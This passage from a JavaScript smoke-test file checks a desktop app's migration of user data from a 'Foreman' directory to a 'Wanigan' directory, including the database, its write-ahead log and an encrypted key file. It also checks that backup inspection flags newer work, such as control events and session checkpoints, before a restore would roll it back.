    'the empty-registry warning names no list of built-in packs, so it cannot go stale again the way it had when a fourth built-in manifest shipped and the sentence still named three',
    String(settingsSrc.includes('Claude, Codex and GLM')));

  /* -- userData migration: the guard matters more than the move -------- */
  say('-- userData migration');
  const mtmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-mig-'));
  const appData = path.join(mtmp, 'Application Support');
  const oldDir = path.join(appData, 'Foreman');
  fs.mkdirSync(path.join(oldDir, 'transcripts'), { recursive: true });
  fs.writeFileSync(path.join(oldDir, 'foreman.db'), 'DB');
  fs.writeFileSync(path.join(oldDir, 'foreman.db-wal'), 'WAL');
  fs.writeFileSync(path.join(oldDir, 'foreman.json'), '{}');
  fs.writeFileSync(path.join(oldDir, 'apikey.bin'), 'KEY');
  fs.writeFileSync(path.join(oldDir, 'transcripts', 's1.jsonl'), 'T');

  const newDir = path.join(appData, 'Wanigan');
  check(migrate.findOldDir(appData, newDir) === oldDir, 'the old directory is found by its database, not its name');

  migrate.moveUserData(oldDir, newDir);
  check(fs.existsSync(path.join(newDir, 'wanigan.db')), 'the database arrives under the new name');
  // A -wal separated from its database silently discards every committed
  // transaction still in the log, so this is the assertion that matters most.
  check(fs.existsSync(path.join(newDir, 'wanigan.db-wal')), 'the write-ahead log travels with the database');
  check(fs.readFileSync(path.join(newDir, 'apikey.bin'), 'utf8') === 'KEY', 'the encrypted key comes across untouched');
  check(fs.existsSync(path.join(newDir, 'transcripts', 's1.jsonl')), 'nested directories come across whole');
  check(!fs.existsSync(oldDir), 'the old directory is gone rather than duplicated');
  check(migrate.findOldDir(appData, newDir) === null, 'a second run finds nothing to do');

  // Merging into a destination Electron already created must never overwrite
  // what the new build wrote there.
  const oldB = path.join(appData, 'foreman');
  const newB = path.join(appData, 'wanigan2');
  fs.mkdirSync(oldB, { recursive: true });
  fs.mkdirSync(newB, { recursive: true });
  fs.writeFileSync(path.join(oldB, 'foreman.db'), 'OLD');
  fs.writeFileSync(path.join(oldB, 'apikey.bin'), 'OLDKEY');
  fs.writeFileSync(path.join(newB, 'apikey.bin'), 'NEWKEY');
  migrate.moveUserData(oldB, newB);
  check(fs.readFileSync(path.join(newB, 'apikey.bin'), 'utf8') === 'NEWKEY',
    'a file already in the destination is not overwritten by the old one');
  check(fs.readFileSync(path.join(newB, 'wanigan.db'), 'utf8') === 'OLD', 'the database still lands');

  fs.rmSync(mtmp, { recursive: true, force: true });

  // P10 · EVIDENCE_CLOCKS decides whether restoring a backup would silently
  // roll work back. It named only session-, run- and learning-bound columns,
  // so goal, proof, trace, control-event, checkpoint, telemetry,
  // knowledge-candidate, scout and schedule rows were all uncovered. Given a
  // database whose only rows newer than the backup were those, both readers
  // took the silence as proof of safety: the Check panel said restoring would
  // drop no recorded work, and index.ts's destructive confirmation dropped its
  // "Everything in between will be dropped" clause on the strength of it.
  const backupSrc = sourceOf('src/main/backup.ts');
  const clockBlock = backupSrc.match(/const EVIDENCE_CLOCKS[\s\S]*?\n\];/)?.[0] ?? '';
  const requiredClocks = [
    "['work_dockets', 'updated_at']", "['work_proofs', 'created_at']",
    "['work_trace_events', 'created_at']", "['control_events', 'created_at']",
    "['session_checkpoints', 'at']", "['session_api_events', 'at']",
    "['knowledge_candidates', 'updated_at']",
    "['improvement_scout_runs', 'started_at']", "['schedule_runs', 'at']",
  ];
  check(clockBlock !== '' && requiredClocks.every((pair) => clockBlock.includes(pair)),
    'EVIDENCE_CLOCKS names the Goal, proof, trace, control-event, checkpoint, telemetry, knowledge-candidate, scout and schedule columns, so days of work in any of them can no longer be rolled back by a restore that reported dropping nothing',
    clockBlock === '' ? 'EVIDENCE_CLOCKS block not found'
      : `missing: ${requiredClocks.filter((pair) => !clockBlock.includes(pair)).join(' ')}`);

  // Forward-only is the bar for joining that list, and work_nodes fails it:
  // retryNode sets started_at and ended_at back to NULL, so a MAX over them
  // can move backwards — which would make a restore look safer than it is at
  // exactly the moment a task was reopened.
  check(!clockBlock.includes("['work_nodes'"),
    'EVIDENCE_CLOCKS excludes work_nodes, whose started_at and ended_at are set back to NULL when a task is reopened and so can move a clock backwards',
    clockBlock.includes("['work_nodes'") ? 'work_nodes is listed' : 'absent');

  const backupHome = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-backup-'));
  const backupDir = path.join(backupHome, 'snapshot');
  const taken = backup.createBackup(backupDir);
  const quietBackup = backup.inspectBackup(backupDir);
  check(quietBackup.problems.length === 0 && quietBackup.wouldDiscardNewer === false,
    'a backup inspected with nothing written since it was taken verifies clean and reports no newer work to discard, so widening the clock list did not turn ordinary launch housekeeping into a false warning on every restore',
    `problems=${quietBackup.problems.map((problem) => problem.code).join(',') || 'none'} wouldDiscardNewer=${quietBackup.wouldDiscardNewer}`);

  const eventClock = (taken.latestEvidenceAt ?? Date.now()) + 1;
  db().prepare('INSERT INTO control_events (id,project_id,source,kind,summary,status,docket_id,created_at) VALUES (?,NULL,?,?,?,?,NULL,?)')
    .run('smoke-p10-event', 'smoke', 'note', 'Recorded after the backup was taken.', 'new', eventClock);
  const afterEvent = backup.inspectBackup(backupDir);
  db().prepare('DELETE FROM control_events WHERE id=?').run('smoke-p10-event');
  check(afterEvent.wouldDiscardNewer === true && afterEvent.currentLatestEvidenceAt === eventClock,
    'one control event recorded after a backup makes that same backup report that restoring it would discard newer work, dated to the event rather than to the last session that ended',
    `wouldDiscardNewer=${afterEvent.wouldDiscardNewer} current=${afterEvent.currentLatestEvidenceAt} expected=${eventClock}`);

  const checkpointClock = eventClock + 1;
  db().prepare("INSERT INTO session_checkpoints (session_id,turn,kind,at,repo_root,status) VALUES ('smoke-p10',1,'turn',?,?,'ok')")
    .run(checkpointClock, backupHome);
  const afterCheckpoint = backup.inspectBackup(backupDir);
  db().prepare("DELETE FROM session_checkpoints WHERE session_id='smoke-p10'").run();
  fs.rmSync(backupHome, { recursive: true, force: true });
  check(afterCheckpoint.wouldDiscardNewer === true && afterCheckpoint.currentLatestEvidenceAt === checkpointClock
    && backupSrc.includes('if (inspection.wouldDiscardNewer && !opts.overwriteNewer)'),
    'a per-turn checkpoint alone moves the clock and restoreBackup still refuses on that flag, so a restore taken mid-session is warned about and blocked even though no session started or ended in between',
    `wouldDiscardNewer=${afterCheckpoint.wouldDiscardNewer} current=${afterCheckpoint.currentLatestEvidenceAt} expected=${checkpointClock}`);

  // This file started its own hook listener for the policy and MCP sections;
  // an open one keeps the event loop alive and the smoke never exits.
  hooks.stopHookServer();
  fs.rmSync(tmp, { recursive: true, force: true });
}
